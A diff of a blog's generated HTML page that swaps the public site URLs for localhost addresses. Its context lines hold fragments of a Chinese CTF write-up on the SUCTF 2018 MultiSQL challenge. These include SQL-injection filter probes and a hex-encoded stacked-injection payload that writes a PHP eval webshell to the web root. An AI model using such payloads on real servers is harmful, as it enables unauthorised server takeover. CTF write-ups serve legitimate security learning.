@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>[SUCTF 2018]MultiSQL(sql读取文件+写入文件) |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="[SUCTF 2018]MultiSQL(sql读取文件+写入文件) |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[SUCTF 2018]MultiSQL(sql读取文件+写入文件) |   » Feed" href="http://localhost:4000/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="[SUCTF 2018]MultiSQL(sql读取文件+写入文件)"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/t4QExMZtn/"/>
+    <meta property="og:url" content="http://localhost:4000/post/t4QExMZtn/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <a class="navbar-brand" href="http://localhost:4000"> </a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,9 +80,9 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            <a href="http://localhost:4000/tag/CTF/" class="tag">CTF</a>
             
-            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            <a href="http://localhost:4000/tag/Web/" class="tag">Web安全</a>
             
         </span>
             <h1>[SUCTF 2018]MultiSQL(sql读取文件+写入文件)</h1>
@@ -106,7 +106,7 @@
 一个是用户信息。输入2-1。返回的是id为1的信息。存在数字型注入<br>
 一个是上文头像。然而绕不过去。。<br>
 先对用户信息fuzz下。看过滤了啥<br>
-<img src="https://guokeya.github.io/post-images/1584015326202.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1584015326202.png" alt="" loading="lazy"><br>
 加上单引号就空白。估计是ban了。这就很难受。不能有单引号。输入sql语句。如果报错也是空白。正则。也是空白。</p>
 <pre><code>0^(substr(1,1,1))
 #空白。可能逗号或substr被过滤
@@ -160,12 +160,12 @@ print(data)
 之前还有一个用户头像上传的地址。有写权限。那就可以利用堆叠注入。直接写shell。</p>
 <pre><code>set @xx=0x53454c45435420273c3f70687020406576616c28245f504f53545b615d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c2e70687027;prepare x from @xx;execute x;
 </code></pre>
-<p><img src="https://guokeya.github.io/post-images/1584017115014.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1584017115014.png" alt="" loading="lazy"><br>
 写入一句话getshell</p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/U00Vbfnjz/">
+            <a href="http://localhost:4000/post/U00Vbfnjz/">
               <span class="post-title">
                 [RootersCTF2019]ImgXweb(session伪造)&rarr;
               </span>
@@ -209,7 +209,7 @@ print(data)
             
               
               <li class="list-inline-item">
-              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+              <a href="http://localhost:4000/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -224,10 +224,10 @@ print(data)
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
